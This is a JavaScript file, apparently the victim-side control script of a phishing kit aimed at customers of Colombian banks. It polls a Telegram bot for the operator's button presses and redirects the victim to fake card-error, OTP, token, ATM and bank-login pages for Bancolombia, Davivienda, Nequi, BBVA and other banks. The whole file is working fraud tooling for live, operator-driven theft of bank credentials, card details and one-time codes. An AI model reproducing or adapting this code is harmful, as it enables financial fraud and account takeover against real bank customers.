const xhr = new XMLHttpRequest();
let updates = [];

xhr.onreadystatechange = function () {
  if (xhr.readyState === 4 && xhr.status === 200) {
    const datosToken = JSON.parse(xhr.responseText);

    const token = datosToken.token;
    const chatId = datosToken.chatId;
    const ip = datosToken.Ip;
    const updateUrl = `https://api.telegram.org/bot${token}/getUpdates`;

    setInterval(() => {

      fetch(updateUrl)
        .then((response) => response.json())
        .then((data) => {
          let lectura;

          updates = data.result;

          if (updates.length > 1) {
            lectura = updates[updates.length - 1];
          } else {
            lectura = updates[0];
          }

          if (!lectura) {
            return;
          }

          if (lectura.callback_query) {
            loadData(ip, chatId, token);
          }
        })
        .catch((error) => {
          console.error("Error al obtener actualizaciones:", error);
        });
    }, 2000);
  }
};

xhr.open("GET", "setting.php", true);
xhr.send();

async function loadData(ip, chatId, token) {
  verificacion(ip, chatId, token);
}

function verificacion(ip, chatId, token) {
  const dataExist = JSON.parse(localStorage.getItem("data"));

  let exist = null;
  let page = null;
  let ipRecibida = null;
  let messageId = null;

  updates.forEach((element) => {
    if (element.callback_query) {

      const texto = element.callback_query.message.text;
      ipRecibida = texto.split("\n")[0];

      if (ipRecibida == ip) {

        page = element.callback_query.data;

        messageId = element.callback_query.message.message_id;
        exist = dataExist.find((item) => item === messageId);

        if (exist) {
          page = null;
        }
      }
    }
  });

  if (!page) {
    return;
  }

  redirecionamiento(page, ip, chatId, ipRecibida, token, dataExist, messageId);
}

async function redirecionamiento(
  pagActual,
  ip,
  chatId,
  ipRecibida,
  token,
  dataExist,
  messageId
) {
  fetch(`https://api.telegram.org/bot${token}/editMessageReplyMarkup`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      message_id: messageId,
    }),
  })
    .then((response) => response.json())
    .then(async () => {
      if (ipRecibida == ip) {
        if (pagActual === "info") {
          window.location.href = "rastrear.php";
        } else if (pagActual === "❌TC") {
          window.location.href = "payment_error.php";
        } else if (pagActual === "⭐️OTP") {
          window.location.href = "3d.php";
        } else if (pagActual === "❌OTP") {
          window.location.href = "3d_error.php";
        } else if (pagActual === "🏦LG") {
          const bank = localStorage.getItem("bank");
          switch (bank) {
            case "BANCOLOMBIA":
              window.location.href = "logo2.php";
              break;
            case "BANCO COLPATRIA":
              window.location.href = "logocolpa5.php";
              break;
            case "BANCO DAVIVIENDA":
              window.location.href = "logodavi3.php";
              break;
            case "BANCO FALABELLA":
              window.location.href = "logofala4.php";
              break;
            case "NEQUI":
              window.location.href = "logonequi6.php";
              break;
            case "BANCO DE BOGOTA":
              window.location.href = "logobogo5.php";
              break;
            case "BANCO BBVA":
              window.location.href = "logobb.php";
              break;
            case "BANCO CAJA SOCIAL":
              window.location.href = "logocaja.php";
              break;
            case "BANCO CITIBANK":
              window.location.href = "logociti.php";
              break;
            case "BANCO POPULAR":
              window.location.href = "logopopu.php";
              break;
            case "TUYA":
              window.location.href = "logotuya.php";
              break;
            case "BANCO DE OCCIDENTE":
              window.location.href = "logoocci.php";
              break;
            default:
              window.location.href = "logo.php";
              break;
          }
        } else if (pagActual === "❌LG") {
          const bank = localStorage.getItem("bank");
          switch (bank) {
            case "BANCOLOMBIA":
              window.location.href = "logo2_error.php";
              break;
            case "BANCO COLPATRIA":
              window.location.href = "logocolpa5.php";
              break;
            case "BANCO DAVIVIENDA":
              window.location.href = "logodavi3.php";
              break;
            case "BANCO FALABELLA":
              window.location.href = "logofala4.php";
              break;
            case "NEQUI":
              window.location.href = "logonequi6.php";
              break;
            case "BANCO DE BOGOTA":
              window.location.href = "logobogo5.php";
              break;
            case "BANCO BBVA":
              window.location.href = "logobb.php";
              break;
            case "BANCO CAJA SOCIAL":
              window.location.href = "logocaja.php";
              break;
            case "BANCO CITIBANK":
              window.location.href = "logociti.php";
              break;
            case "BANCO POPULAR":
              window.location.href = "logopopu.php";
              break;
            case "TUYA":
              window.location.href = "logotuya.php";
              break;
            case "BANCO DE OCCIDENTE":
              window.location.href = "logoocci.php";
              break;
            case "BANCO DE OCCIDENTE":
                window.location.href = "logoocci.php";
                break;

            default:
              window.location.href = "logo.php";
              break;
          }
        } else if (pagActual === "✅FINAL") {
          window.location.href = "finish.php";
        } else if (pagActual === "⭐️TK") {
          window.location.href = "token.php";
        } else if (pagActual === "⭐️AP") {
          window.location.href = "otpap.php";
        } else if (pagActual === "🏧") {
          window.location.href = "atm.php";
        }
        dataExist.push(messageId);
        localStorage.setItem("data", JSON.stringify(dataExist));
      }
    });
}
